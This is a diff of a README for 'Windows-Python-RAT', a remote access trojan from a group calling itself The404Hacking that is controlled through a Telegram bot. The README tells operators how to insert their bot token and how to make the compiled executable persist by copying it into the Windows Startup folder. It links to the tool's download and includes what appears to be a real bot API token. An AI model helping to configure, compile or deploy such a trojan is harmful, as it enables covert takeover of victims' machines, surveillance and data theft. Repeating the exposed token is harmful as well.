@@ -12,14 +12,12 @@
 
 -------------------------------
 # Robot for initial Windows-Python-RAT testing
-
 Bot ID: [@W_P_RAT_Bot](https://t.me/W_P_RAT_Bot)
 
 Token: `586363223:AAHSLdPnAE60avs_T25l_HjzRahtw6PhxDY`
 
 -------------------------------
 # Set Bot API-Token
-
 To replace your robot Token in RAT, simply go to Line 35 in the **Windows-Python-RAT.py** file and place your API-TOKEN instead of `TOKEN`.
 
 In Line 35:
@@ -32,10 +30,9 @@ Example for Replace Token:
 ![Replace Token](Token.png?raw=true "Replace Token")
 -------------------------------
 # StartUP Settings
+For startup settings, you must first write the name of your bot before compiling it in the **Windows-Python-RAT.py** file. For example, before compiling the RAT file, you need to go to line 281 and name it as an `YOUR-COMPILED-RAT-NAME.exe`.
 
-For startup settings, you must first write the name of your bot before compiling it in the **Windows-Python-RAT.py** file. For example, before compiling the RAT file, you need to go to line 291 and name it as an `YOUR-COMPILED-RAT-NAME.exe`.
-
-In Line 291:
+In Line 281:
 ```python
 os.system('copy YOUR-COMPILED-RAT-NAME.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')
 #replace your rat name on 'YOUR-COMPILED-RAT-NAME.exe'
@@ -102,15 +99,15 @@ RAT Control Panel [@W_P_RAT_Bot](https://T.me/W_P_RAT_Bot):
 
 
 
-## Download and Clone
+# Download and Clone
 > Download: Click [Here](https://github.com/The404Hacking/Windows-Python-RAT/archive/master.zip)
 
 > Clone: git clone [https://github.com/The404Hacking/Windows-Python-RAT.git](https://github.com/The404Hacking/Windows-Python-RAT.git)
 
-## The404Hacking | Digital UnderGround Team
+# The404Hacking | Digital UnderGround Team
 [The404Hacking](https://T.me/The404Hacking)
 
-## Follow us !
+# Follow us !
 [The404Hacking](https://T.me/The404Hacking) - [The404Cracking](https://T.me/The404Cracking)
 
 [Instagram](https://instagram.com/The404Hacking) - [GitHub](https://github.com/The404Hacking)
